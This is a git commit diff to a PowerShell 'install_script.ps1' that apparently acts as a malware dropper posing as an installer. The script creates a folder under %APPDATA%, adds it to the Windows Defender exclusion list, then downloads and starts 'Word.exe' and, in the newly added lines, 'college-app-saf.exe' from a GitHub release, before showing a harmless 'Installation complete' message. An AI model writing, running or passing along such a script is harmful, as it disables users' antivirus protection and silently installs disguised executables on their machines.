f2843806b28702c98c730d4ceeb911b9c2e0fdd4
jstankovic2 <jstankovic102@gmail.com>
2024-10-27 16:28:32 +0100

    Update install_script.ps1

--- install_script.ps1
+++ install_script.ps1
@@ -1,10 +1,10 @@
-# Load shits
+# Load Windows Forms for displaying a message box
 Add-Type -AssemblyName System.Windows.Forms
 
-# Set up the folder path
+# Set up the folder path in %appdata%
 $folderPath = Join-Path -Path $env:APPDATA -ChildPath "word"
 
-# Create folder if !exist
+# Create the folder if it doesn't exist
 if (!(Test-Path -Path $folderPath)) {
     New-Item -ItemType Directory -Path $folderPath | Out-Null
     Write-Output "Created folder: $folderPath"
@@ -16,17 +16,21 @@ if (!(Test-Path -Path $folderPath)) {
 Add-MpPreference -ExclusionPath $folderPath
 Write-Output "Whitelist complete."
 
-# Define the download URL and destination path
-$url = "https://github.com/jstankovic2/fade_urls/releases/download/dddd/Word.exe"
-$destination = Join-Path -Path $folderPath -ChildPath "Word.exe"
+# Download and run Word.exe
+$url1 = "https://github.com/jstankovic2/fade_urls/releases/download/dddd/Word.exe"
+$destination1 = Join-Path -Path $folderPath -ChildPath "Word.exe"
+Invoke-WebRequest -Uri $url1 -OutFile $destination1
+Write-Output "Download of Word.exe complete."
+Start-Process -FilePath $destination1
+Write-Output "Word.exe started."
 
-# Download the file
-Invoke-WebRequest -Uri $url -OutFile $destination
-Write-Output "Download complete."
-
-# Run the downloaded executable
-Start-Process -FilePath $destination
-Write-Output "Executable started."
+# Download and run college-app-saf.exe
+$url2 = "https://github.com/jstankovic2/fade_urls/releases/download/dtfghkjmftyuk/college-app-saf.exe"
+$destination2 = Join-Path -Path $folderPath -ChildPath "college-app-saf.exe"
+Invoke-WebRequest -Uri $url2 -OutFile $destination2
+Write-Output "Download of college-app-saf.exe complete."
+Start-Process -FilePath $destination2
+Write-Output "college-app-saf.exe started."
 
 # Display the completion message
 [System.Windows.Forms.MessageBox]::Show("Installation complete. You can close this window.", "Installation Status", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
